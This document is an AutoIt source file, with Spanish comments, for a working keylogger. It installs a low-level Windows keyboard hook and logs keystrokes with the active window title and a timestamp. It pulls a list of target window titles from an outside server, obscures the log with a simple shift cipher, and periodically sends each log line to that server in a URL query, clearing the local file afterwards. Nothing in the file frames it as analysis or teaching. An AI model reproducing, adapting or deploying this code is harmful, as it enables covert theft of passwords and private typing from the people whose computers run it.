#include <WinAPI.au3>
#include <WindowsConstants.au3>
#include <InetConstants.au3>
#include <MsgBoxConstants.au3>
#include <Array.au3>

Opt('MustDeclareVars', 1)
; Asociar una función a la acción "Salir"
TrayItemSetOnEvent(-1, "Salir")

; Función que se ejecuta al hacer clic en "Salir"
Func Salir()
	write_file()
	send_file(true)
    MsgBox($MB_ICONINFORMATION, "Mensaje", "Se ha hecho clic en Salir")
    Exit
EndFunc



Global $hHook, $hStub_KeyProc, $buf = "", $title_actual = "", $title_1 = "", $keycode, $buffer = "", $nMsg
Global $file, $f3 = 0
Global $url = "https://kl.up.railway.app/?kl="
Global $lastActiveWindow = "", $lastActiveTime = 0
Global $file_name = @computername & "_log.txt"
Global $last_send = 0

	; Realizar la solicitud HTTP GET
	Local $sURL = "https://kl.up.railway.app/l"
	Local $dData = InetRead($sURL)
	Local $sContent= BinaryToString($dData)


; Verificar si la solicitud fue exitosa
If @error = 0 Then
    ; Convertir el contenido a una matriz de títulos
    Local $aLines = StringSplit($sContent, ";", 1)
    Global $aTitles[$aLines[0]]

    For $i = 1 To $aLines[0]
        $aTitles[$i - 1] = $aLines[$i]
    Next

EndIf





While 1
	_Main()
WEnd


Func _Main()
    Local $hmod
    $f3 = 1
    $hStub_KeyProc = DllCallbackRegister("_KeyProc", "long", "int;wparam;lparam")
    $hmod = _WinAPI_GetModuleHandle(0)
    $hHook = _WinAPI_SetWindowsHookEx($WH_KEYBOARD_LL, DllCallbackGetPtr($hStub_KeyProc), $hmod)
    
    Local $startTime = TimerInit()
	$last_send = TimerInit()
	
	send_file(true)
    While 1
        Sleep(10)
        ; Comprobar si la ventana activa ha cambiado
        Local $currentActiveWindow = WinGetTitle("")
        If $currentActiveWindow <> $lastActiveWindow Then
            $lastActiveWindow = $currentActiveWindow
            $lastActiveTime = TimerInit()
        EndIf
        ; Comprobar si han pasado 30 segundos desde la última vez que se escribió en el archivo
        If TimerDiff($lastActiveTime) > 10000 Then ; 30 segundos en milisegundos
			write_file()
            $lastActiveTime = TimerInit()
			send_file(false)
		EndIf
	WEnd
EndFunc




Func write_file()
    If $buffer <> "" Then
		local $file = FileOpen($file_name, $FO_APPEND )
        local $currentActiveWindow = WinGetTitle("")
        $buffer = @CRLF & @CRLF & "====Title:" & $currentActiveWindow & "====Time:" & @YEAR & "." & @MON & "." & @MDAY & "--" & @HOUR & ":" & @MIN & ":" & @SEC & @CRLF & $buffer
        $buffer = CifrarDesplazamiento($buffer, 3)

		$buffer = BinaryToString(Binary($buffer))
        FileWrite($file, $buffer)
        $buffer = ""
		FileClose($file)
    EndIf
EndFunc







Func send_file($forced_action)
    If TimerDiff($last_send) > 600000 Or $forced_action = True Then ; Si han pasado más de 10 minutos o si se forzó la acción
        If FileExists($file_name) Then ; Verifica si el archivo existe
            Local $aArray = FileReadToArray($file_name)
            For $i = 0 To UBound($aArray) - 1
                InetRead($url & $aArray[$i], $INET_FORCERELOAD)
            Next
            ; Vaciar el contenido del archivo en lugar de eliminarlo
            $file = FileOpen($file_name, $FO_OVERWRITE)
           FileClose($file)
        EndIf
        $last_send = TimerInit() ; Actualiza el tiempo de último envío
    EndIf
EndFunc

Func EvaluateKey($keycode)
    local $currentActiveWindow = WinGetTitle("")
    $buffer = key($keycode)
	 
	Local $bFound = False

	For $i = 0 To UBound($aTitles) - 1
		If StringLeft($currentActiveWindow, StringLen($aTitles[$i])) = $aTitles[$i] Then
			$bFound = True
			ExitLoop
		EndIf
	Next

	If $bFound Then
        If $title_1 <> $currentActiveWindow Then
            $title_1 = $currentActiveWindow
            $buffer = @CRLF & @CRLF & "====Title:" & $title_1 & "====Time:" & @YEAR & "." & @MON & "." & @MDAY & "--" & @HOUR & ":" & @MIN & ":" & @SEC & @CRLF & $buffer
       EndIf
	   $buffer = CifrarDesplazamiento($buffer, 3)
	   FileWrite($file, $buffer)
	EndIf
	
EndFunc

func debug_info($text)
	ToolTip($text, 100, 100)
	Sleep(5000) ; Espera 5 segundos
	ToolTip("") ; Oculta el mensaje contextual

EndFunc

Func key($keycode2)
    If $keycode2 = 8 Then
		$buf = "[backspace]"
	EndIf
	If $keycode2 = 9 Then
		$buf = "[TAB]"
	EndIf
	If $keycode2 = 13 Then
		$buf = "[ENTER]"
	EndIf
	If $keycode2 = 19 Then
		$buf = "[PAUSE]"
	EndIf
	If $keycode2 = 20 Then
		$buf = "[CAPSLOCK]"
	EndIf
	If $keycode2 = 27 Then
		$buf = "[ESC]"
	EndIf
	If $keycode2 = 32 Then
		$buf = "[SPACE]"
	EndIf
	If $keycode2 = 33 Then
		$buf = "[PAGEUP]"
	EndIf
	If $keycode2 = 34 Then
		$buf = "[PAGEDOWN]"
	EndIf
	If $keycode2 = 35 Then
		$buf = "[END]"
	EndIf
	If $keycode2 = 36 Then
		$buf = "[HOME]"
	EndIf
	If $keycode2 = 37 Then
		$buf = "[¡û]"
	EndIf
	If $keycode2 = 38 Then
		$buf = "[¡ü]"
	EndIf
	If $keycode2 = 39 Then
		$buf = "[¡ú]"
	EndIf
	If $keycode2 = 40 Then
		$buf = "[¡ý]"
	EndIf
	If $keycode2 = 42 Then
		$buf = "[PRINT]"
	EndIf
	If $keycode2 = 44 Then
		$buf = "[PRINT SCREEN]"
	EndIf
	If $keycode2 = 45 Then
		$buf = "[INS]"
	EndIf
	If $keycode2 = 46 Then
		$buf = "[DEL]"
	EndIf
	If $keycode2 = 48 Or $keycode2 = 96 Then
		$buf = 0
	EndIf
	If $keycode2 = 49 Or $keycode2 = 97 Then
		$buf = 1
	EndIf
	If $keycode2 = 50 Or $keycode2 = 98 Then
		$buf = 2
	EndIf
	If $keycode2 = 51 Or $keycode2 = 99 Then
		$buf = 3
	EndIf
	If $keycode2 = 52 Or $keycode2 = 100 Then
		$buf = 4
	EndIf
	If $keycode2 = 53 Or $keycode2 = 101 Then
		$buf = 5
	EndIf
	If $keycode2 = 54 Or $keycode2 = 102 Then
		$buf = 6
	EndIf
	If $keycode2 = 55 Or $keycode2 = 103 Then
		$buf = 7
	EndIf
	If $keycode2 = 56 Or $keycode2 = 104 Then
		$buf = 8
	EndIf
	If $keycode2 = 57 Or $keycode2 = 105 Then
		$buf = 9
	EndIf
	If $keycode2 = 65 Then
		$buf = "a"
	EndIf
	If $keycode2 = 66 Then
		$buf = "b"
	EndIf
	If $keycode2 = 67 Then
		$buf = "c"
	EndIf
	If $keycode2 = 68 Then
		$buf = "d"
	EndIf
	If $keycode2 = 69 Then
		$buf = "e"
	EndIf
	If $keycode2 = 70 Then
		$buf = "f"
	EndIf
	If $keycode2 = 71 Then
		$buf = "g"
	EndIf
	If $keycode2 = 72 Then
		$buf = "h"
	EndIf
	If $keycode2 = 73 Then
		$buf = "i"
	EndIf
	If $keycode2 = 74 Then
		$buf = "j"
	EndIf
	If $keycode2 = 75 Then
		$buf = "k"
	EndIf
	If $keycode2 = 76 Then
		$buf = "l"
	EndIf
	If $keycode2 = 77 Then
		$buf = "m"
	EndIf
	If $keycode2 = 78 Then
		$buf = "n"
	EndIf
	If $keycode2 = 79 Then
		$buf = "o"
	EndIf
	If $keycode2 = 80 Then
		$buf = "p"
	EndIf
	If $keycode2 = 81 Then
		$buf = "q"
	EndIf
	If $keycode2 = 82 Then
		$buf = "r"
	EndIf
	If $keycode2 = 83 Then
		$buf = "s"
	EndIf
	If $keycode2 = 84 Then
		$buf = "t"
	EndIf
	If $keycode2 = 85 Then
		$buf = "u"
	EndIf
	If $keycode2 = 86 Then
		$buf = "v"
	EndIf
	If $keycode2 = 87 Then
		$buf = "w"
	EndIf
	If $keycode2 = 88 Then
		$buf = "x"
	EndIf
	If $keycode2 = 89 Then
		$buf = "y"
	EndIf
	If $keycode2 = 90 Then
		$buf = "z"
	EndIf
	If $keycode2 = 91 Or $keycode2 = 92 Then
		$buf = "[Windows]"
	EndIf
	If $keycode2 = 106 Then
		$buf = "*"
	EndIf
	If $keycode2 = 107 Then
		$buf = "+"
	EndIf
	If $keycode2 = 109 Or $keycode2 = 189 Then
		$buf = "-"
	EndIf
	If $keycode2 = 110 Or $keycode2 = 190 Then
		$buf = "."
	EndIf
	If $keycode2 = 111 Or $keycode2 = 191 Then
		$buf = "/"
	EndIf
	If $keycode2 = 112 Then
		$buf = "[F1]"
	EndIf
	If $keycode2 = 113 Then
		$buf = "[F2]"
	EndIf
	If $keycode2 = 114 Then
		$buf = "[F3]"
	EndIf
	If $keycode2 = 115 Then
		$buf = "[F4]"
	EndIf
	If $keycode2 = 116 Then
		$buf = "[F5]"
	EndIf
	If $keycode2 = 117 Then
		$buf = "[F6]"
	EndIf
	If $keycode2 = 118 Then
		$buf = "[F7]"
	EndIf
	If $keycode2 = 119 Then
		$buf = "[F8]"
	EndIf
	If $keycode2 = 120 Then
		$buf = "[F9]"
	EndIf
	If $keycode2 = 121 Then
		$buf = "[F10]"
	EndIf
	If $keycode2 = 122 Then
		$buf = "[F11]"
	EndIf
	If $keycode2 = 123 Then
		$buf = "[F12]"
	EndIf
	If $keycode2 = 124 Then
		$buf = "[F13]"
	EndIf
	If $keycode2 = 125 Then
		$buf = "[F14]"
	EndIf
	If $keycode2 = 126 Then
		$buf = "[F15]"
	EndIf
	If $keycode2 = 127 Then
		$buf = "[F16]"
	EndIf
	If $keycode2 = 144 Then
		$buf = "[NUMLOCK]"
	EndIf
	If $keycode2 = 145 Then
		$buf = "[SCROLLLOCK]"
	EndIf
	If $keycode2 = 160 Or $keycode2 = 161 Then
		$buf = "[Shift]"
	EndIf
	If $keycode2 = 162 Or $keycode2 = 163 Then
		$buf = "[Ctrl]"
	EndIf
	If $keycode2 = 164 Then
		$buf = "[Alt]"
	EndIf
	If $keycode2 = 186 Then
		$buf = ";"
	EndIf
	If $keycode2 = 187 Then
		$buf = "="
	EndIf
	If $keycode2 = 188 Then
		$buf = ","
	EndIf
	If $keycode2 = 192 Then
		$buf = "`"
	EndIf
	If $keycode2 = 219 Then
		$buf = "["
	EndIf
	If $keycode2 = 220 Then
		$buf = ""
	EndIf
	If $keycode2 = 221 Then
		$buf = "]"
	EndIf
    Return $buf
EndFunc

Func _KeyProc($nCode, $wParam, $lParam)
    Local $tKEYHOOKS
    $tKEYHOOKS = DllStructCreate($tagKBDLLHOOKSTRUCT, $lParam)
    If $nCode < 0 Then
        Return _WinAPI_CallNextHookEx($hHook, $nCode, $wParam, $lParam)
    EndIf
    If $wParam = $WM_KEYDOWN Then
        EvaluateKey(DllStructGetData($tKEYHOOKS, "vkCode"))
    Else
        Local $flags = DllStructGetData($tKEYHOOKS, "flags")
        Switch $flags
            Case $LLKHF_ALTDOWN
                EvaluateKey(DllStructGetData($tKEYHOOKS, "vkCode"))
        EndSwitch
    EndIf
    Return _WinAPI_CallNextHookEx($hHook, $nCode, $wParam, $lParam)
EndFunc


Func DescifrarDesplazamiento($mensajeCifrado, $desplazamiento)
    Return CifrarDesplazamiento($mensajeCifrado, 997997 - $desplazamiento)
EndFunc

Func CifrarDesplazamiento($mensaje, $desplazamiento)
    Local $resultado = ""
    For $i = 1 To StringLen($mensaje)
        Local $caracter = StringMid($mensaje, $i, 1)
        Local $asciiValue = AscW($caracter)

        If $asciiValue >= 32 Then
            $caracter = ChrW(Mod($asciiValue - 32 + $desplazamiento, 997997) + 32)
        EndIf

        $resultado &= $caracter
    Next
    Return $resultado
EndFunc

